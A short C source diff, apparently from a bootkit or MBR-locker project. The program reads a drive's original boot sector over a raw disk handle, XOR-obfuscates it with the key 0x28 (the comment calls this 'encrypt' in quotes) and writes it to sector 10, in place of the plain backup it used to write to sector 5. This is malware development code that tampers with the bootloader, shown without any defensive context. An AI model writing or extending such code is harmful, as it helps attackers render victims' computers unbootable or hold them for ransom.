@@ -87,6 +87,7 @@ int main()
 
 	//Back up the original bootloader from sector 0 and save it to sector 5
 	char bootSectorBackup[512] = { NULL };
+	char bootSectorEncrypted[512] = { NULL };
 
 	if (!Read(driveHandle, 0, sizeof(bootSectorBackup), bootSectorBackup))
 	{
@@ -96,7 +97,16 @@ int main()
 
 	}
 
-	if (!Write(driveHandle, 5, sizeof(bootSectorBackup), bootSectorBackup))
+
+	//"encrypt" the original bootsector, and write it to sector 10
+	for (int i = 0; i < sizeof(bootSectorBackup); i++)
+	{
+		int temp = bootSectorBackup[i] ^ 0x28;
+		bootSectorEncrypted[i] = temp;
+	}
+
+
+	if (!Write(driveHandle, 10, sizeof(bootSectorEncrypted), bootSectorEncrypted))
 	{
 		printf("[*] Backup Write failed\r\n");
 		CloseHandle(driveHandle);
